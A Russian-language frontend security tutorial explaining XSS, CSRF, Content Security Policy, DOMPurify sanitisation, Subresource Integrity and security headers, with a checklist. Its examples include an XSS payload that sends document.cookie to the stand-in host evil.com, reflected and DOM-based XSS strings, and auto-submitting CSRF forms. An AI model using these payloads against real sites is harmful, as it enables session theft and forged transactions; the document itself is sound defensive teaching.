---
title: "Безопасность: XSS, CSRF, CSP, Sanitize — защита фронтенда"
description: "Безопасность фронтенд-приложений: XSS, CSRF, Content Security Policy, санитизация данных, HTTPS, Subresource Integrity и чеклист безопасности."
section: web-fundamentals
difficulty: intermediate
readTime: 15
order: 7
tags: [security, xss, csrf, csp, sanitize, https, frontend]
---

## Почему безопасность важна для фронтендера

Фронтенд — первая линия обороны. Пользователь взаимодействует с вашим кодом, и если есть уязвимость, злоумышленник может:
- Украсть данные пользователей (пароли, токены)
- Выполнить действия от имени пользователя
- Перенаправить на фишинговый сайт
- Заставить браузер майнить криптовалюту

Основные типы атак на фронтенд: **XSS**, **CSRF**, **Clickjacking**, **Open Redirect**.

## XSS (Cross-Site Scripting)

XSS — внедрение вредоносного JavaScript-кода на страницу. Если сайт отображает пользовательский ввод без экранирования, атакант может выполнить любой JS-код в браузере жертвы.

### Пример

Форум отображает комментарии без экранирования:

```ts
comment = '<script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>'

document.getElementById('comments').innerHTML = comment
```

Атакант оставляет такой комментарий → скрипт выполняется у всех, кто открывает страницу.

### Типы XSS

**1. Stored XSS (сохранённый)** — вредоносный код сохраняется на сервере (комментарий, профиль) и отображается всем пользователям. Самый опасный.

**2. Reflected XSS (отражённый)** — код передаётся в URL и «отражается» на странице:
```
https://site.com/search?q=<script>alert(document.cookie)</script>
```

**3. DOM-based XSS** — уязвимость в клиентском JavaScript:
```ts
const hash = location.hash.slice(1)
document.getElementById('output').innerHTML = hash
// URL: https://site.com#<img src=x onerror=alert(1)>
```

### Защита от XSS

#### 1. Никогда не используйте innerHTML с пользовательскими данными

Плохо:
```ts
element.innerHTML = userInput
```

Хорошо:
```ts
element.textContent = userInput          // Текст, не HTML
```

#### 2. Экранирование (Escaping)

```ts
function escapeHtml(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
  }
  return str.replace(/[&<>"']/g, (char) => map[char])
}

element.innerHTML = `<p>${escapeHtml(userInput)}</p>`
```

#### 3. Sanitize (DOMPurify)

Когда нужно разрешить часть HTML (жирный текст, ссылки), но удалить опасные теги:

```bash
npm install dompurify
npm install -D @types/dompurify
```

```ts
import DOMPurify from 'dompurify'

const dirty = '<b>Привет</b><script>alert("xss")</script><img src=x onerror=alert(1)>'
const clean = DOMPurify.sanitize(dirty)
// '<b>Привет</b><img src="x">'  (script и onerror удалены)

element.innerHTML = clean
```

DOMPurify разрешает безопасные HTML-теги и атрибуты, удаляя `<script>`, `onclick`, `onerror` и подобное.

#### 4. Vue и React автоматически экранируют

```vue
<template>
  <p>{{ userInput }}</p>              <!-- Безопасно: экранируется -->
  <p v-html="userInput"></p>          <!-- ОПАСНО: не экранируется! -->
</template>
```

```tsx
<p>{userInput}</p>                    // Безопасно
<p dangerouslySetInnerHTML={{ __html: userInput }} />  // ОПАСНО!
```

`v-html` и `dangerouslySetInnerHTML` — используйте только с доверенными данными или после санитизации.

#### 5. Content Security Policy (CSP)

CSP — HTTP-заголовок, который указывает браузеру, какие ресурсы разрешено загружать:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
```

Даже если злоумышленник внедрит `<script>`, браузер его не выполнит — CSP запрещает inline-скрипты.

## CSRF (Cross-Site Request Forgery)

CSRF — атака, при которой злоумышленный сайт отправляет запрос к вашему сайту от имени залогиненного пользователя.

### Пример

Пользователь залогинен на `bank.com`. Он заходит на `evil.com`, где есть:

```html
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
```

Или форма:
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>
```

Браузер автоматически отправляет cookies `bank.com` → сервер думает, что это легитимный запрос.

### Защита от CSRF

#### 1. CSRF-токен

Сервер генерирует уникальный токен и отдаёт его в HTML-форме. При отправке формы токен проверяется:

```ts
// Сервер
app.get('/form', (req, res) => {
  const csrfToken = generateToken()
  res.cookie('csrf_token', csrfToken, { httpOnly: false })
  res.json({ csrfToken })
})

app.post('/transfer', (req, res) => {
  const cookieToken = req.cookies.csrf_token
  const headerToken = req.headers['x-csrf-token']
  if (cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' })
  }
  // ...
})
```

```ts
// Фронтенд
const csrfToken = getCookie('csrf_token')

await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json',
  },
  credentials: 'include',
  body: JSON.stringify({ to: 'bob', amount: 100 }),
})
```

Злоумышленник на `evil.com` не может прочитать cookie `csrf_token` с `bank.com` (Same-Origin Policy), поэтому не может подделать запрос.

#### 2. SameSite cookies

```ts
Set-Cookie: session=abc123; SameSite=Strict
```

`SameSite=Strict` — кука не отправляется при cross-site запросах. CSRF невозможен.

`SameSite=Lax` (по умолчанию) — защищает от POST-CSRF, но разрешает навигацию.

#### 3. Проверка Origin / Referer

```ts
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer
  if (origin && !origin.startsWith('https://mysite.com')) {
    return res.status(403).json({ error: 'Invalid origin' })
  }
  next()
})
```

## Content Security Policy (CSP)

CSP — мощный механизм защиты, который контролирует, какие ресурсы браузер может загружать.

### Основные директивы

```
Content-Security-Policy:
  default-src 'self';                          // По умолчанию — только свой домен
  script-src 'self' https://cdn.example.com;   // Скрипты — только свои и CDN
  style-src 'self' 'unsafe-inline';            // Стили — свои и inline
  img-src 'self' data: https:;                 // Изображения — свои, data: и https
  font-src 'self' https://fonts.googleapis.com;
  connect-src 'self' https://api.example.com;  // fetch/XHR — только к своим
  frame-src 'none';                            // Никаких iframe
  object-src 'none';                           // Никаких <object>, <embed>
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';                      // Никто не может встроить через iframe
```

### Значения

| Значение | Описание |
|---|---|
| `'self'` | Текущий origin |
| `'none'` | Ничего |
| `'unsafe-inline'` | Разрешить inline-скрипты и стили |
| `'unsafe-eval'` | Разрешить `eval()`, `new Function()` |
| `'nonce-abc123'` | Разрешить скрипт с `nonce="abc123"` |
| `'sha256-...'` | Разрешить скрипт с точным хешем |
| `https:` | Любой HTTPS-URL |
| `*.example.com` | Все поддомены |

### Nonce (рекомендуется)

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-r4nd0m'" />
<script nonce="r4nd0m">
  console.log('Этот скрипт разрешён')
</script>
<script>
  console.log('Этот скрипт заблокирован')
</script>
```

Сервер генерирует уникальный nonce на каждый запрос.

### Report-only (тестирование)

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-reports
```

Не блокирует — только сообщает о нарушениях. Полезно для постепенного внедрения CSP.

## Subresource Integrity (SRI)

SRI гарантирует, что загруженный с CDN скрипт не был изменён:

```html
<script
  src="https://cdn.example.com/vue@3.4.0.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxT/8a9Bp9r1z9Z5Z..."
  crossorigin="anonymous"
></script>
```

Если файл на CDN изменён (взломан) — браузер его не загрузит.

Генерация SRI:
```bash
curl -s https://cdn.example.com/vue@3.4.0.js | openssl dgst -sha384 -binary | openssl base64 -A
```

## Другие заголовки безопасности

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
HSTS — браузер всегда использует HTTPS для этого домена.

```
X-Content-Type-Options: nosniff
```
Запрещает браузеру угадывать MIME-тип — предотвращает выполнение загруженного файла как скрипта.

```
X-Frame-Options: DENY
```
Запрещает встраивание в iframe — защита от clickjacking.

```
Referrer-Policy: strict-origin-when-cross-origin
```
Контролирует, какой Referer отправлять при переходах.

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```
Запрещает или ограничивает доступ к API браузера (камера, микрофон, геолокация).

## Чеклист безопасности

### Обязательные

- [ ] HTTPS на всём сайте (редирект с HTTP)
- [ ] HttpOnly + Secure + SameSite для авторизационных cookie
- [ ] Экранирование пользовательского ввода (не `innerHTML`)
- [ ] CSP минимум `default-src 'self'`
- [ ] Проверка CSRF для state-changing запросов (POST/PUT/DELETE)
- [ ] HSTS заголовок

### Рекомендуемые

- [ ] DOMPurify для пользовательского HTML
- [ ] SRI для CDN-скриптов
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Referrer-Policy
- [ ] Permissions-Policy
- [ ] Регулярное обновление зависимостей (`npm audit`)

## Проверка зависимостей

```bash
npm audit                              # Проверить на известные уязвимости
npm audit fix                          # Автоисправить что можно
npx better-npm-audit audit             # Альтернатива
```

## Итог

- **XSS** — внедрение вредоносного JS. Защита: экранирование, DOMPurify, CSP
- **CSRF** — подделка запросов. Защита: CSRF-токен, SameSite cookies
- **CSP** — указывает браузеру, что разрешено загружать. Мощная защита от XSS
- **HttpOnly** — куки недоступны из JS (защита от XSS)
- **SRI** — гарантирует целостность CDN-скриптов
- Никогда не доверяйте данным от пользователя — всегда экранируйте
- Используйте `textContent` вместо `innerHTML`, `v-html` только с DOMPurify
